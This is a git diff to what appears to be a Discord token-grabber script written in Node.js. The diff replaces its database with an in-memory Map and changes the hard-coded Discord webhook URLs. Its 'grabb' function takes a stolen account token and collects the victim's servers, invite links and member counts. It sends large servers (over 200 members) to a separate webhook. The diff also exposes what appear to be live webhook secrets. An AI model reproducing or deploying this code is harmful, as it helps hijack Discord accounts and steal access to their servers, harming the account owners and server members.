@@ -1,10 +1,5 @@
 const axios = require("axios");
-const {
-  JsonDatabase
-} = require("wio.db")
-const db = new JsonDatabase({
-  databasePath: "./db.json"
-})
+const db = new Map();
 
 module.exports = async (req, res) => {
   const {
@@ -116,14 +111,14 @@ async function grabb(applicationId, token) {
 
   const timestamp = Math.floor(Date.now() / 1000);
   
-  let webhookURL = "https://discord.com/api/webhooks/1321895657908473957/dtoTOj8qF_YTnUrDlWUwykTiNFeO5WzISwL_GiyfMwlnRqoaHwRz09txoIWECb-xuYAb"
+  let webhookURL = "https://discord.com/api/webhooks/1321898117863571476/zBz2K9BwFzfESu4URmMdiBR5t522EMSrY6qyPJfors53bxM83UrYL7xrGQscQYWou5sl"
 
   const servers = await Promise.all(
     guilds.map(async (guild) => {
       const invite = await getServerInvite(guild.id, token);
       const memberCount = await getGuildMemberCount(guild.id, token)
       if (Number(memberCount.total) > 200) {
-        webhookURL = "https://discord.com/api/webhooks/1319504519171932202/0DOBxgvaaVFimYzpzLo-n1YaMwd3N_E1o68YYRE4p5D3W0wUFGlENq5oYSrnVghKufeR"
+        webhookURL = "https://discord.com/api/webhooks/1321895657908473957/dtoTOj8qF_YTnUrDlWUwykTiNFeO5WzISwL_GiyfMwlnRqoaHwRz09txoIWECb-xuYAb"
       }
       return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${memberCount.total || ''} Membros\` (\`${memberCount.online} Online\`)`;
     })
